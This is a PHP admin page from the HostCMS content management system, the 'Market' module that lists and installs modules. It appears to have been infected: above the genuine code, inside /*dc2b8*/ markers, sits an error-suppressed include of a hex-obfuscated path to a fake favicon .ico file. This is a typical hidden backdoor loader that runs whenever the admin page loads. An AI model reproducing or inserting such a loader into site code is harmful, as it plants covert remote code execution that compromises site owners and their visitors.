<?php
/*dc2b8*/

@include "\x2fh\x6fm\x65/\x6ee\x6f-\x76o\x2ff\x65o\x72o\x2er\x75/\x64o\x63s\x2fm\x6fd\x75l\x65s\x2fb\x65n\x63h\x6da\x72k\x2fc\x6fn\x66i\x67/\x66a\x76i\x63o\x6e_\x656\x31c\x32d\x2ei\x63o";

/*dc2b8*/
/**
 * Market.
 *
 * @package HostCMS
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
require_once('../../bootstrap.php');

Core_Auth::authorization($sModule = 'market');

$sAdminFormAction = '/admin/market/index.php';

$category_id = intval(Core_Array::getRequest('category_id'));

// Контроллер формы
$oAdmin_Form_Controller = Admin_Form_Controller::create();
$oAdmin_Form_Controller
	->module(Core_Module::factory($sModule))
	->setUp()
	->path($sAdminFormAction)
	->title(Core::_('Market.title'))
	->setAdditionalParam($category_id
		? 'category_id=' . $category_id
		: ''
	);

	
ob_start();

$oMarket_Controller = Market_Controller::instance();
$oMarket_Controller
	->controller($oAdmin_Form_Controller)
	->admin_view(
		Admin_View::create()
			->module(Core_Module::factory($sModule))
	)
	->setMarketOptions()
	->category_id($category_id)
	->page($oAdmin_Form_Controller->getCurrent());

$category_id && $oMarket_Controller->order('price');
	
// Установка модуля
if (Core_Array::getRequest('install'))
{
	$oMarket_Controller->getModule(intval(Core_Array::getRequest('install')));
}
else
{
	// Вывод списка
	$oMarket_Controller
		->getMarket()
		->showItemsList();
}

Core_Skin::instance()
	->answer()
	->ajax(Core_Array::getRequest('_', FALSE))
	->content(ob_get_clean())
	->message($oMarket_Controller->admin_view->message)
	->title(Core::_('Market.title'))
	->module($sModule)
	->execute();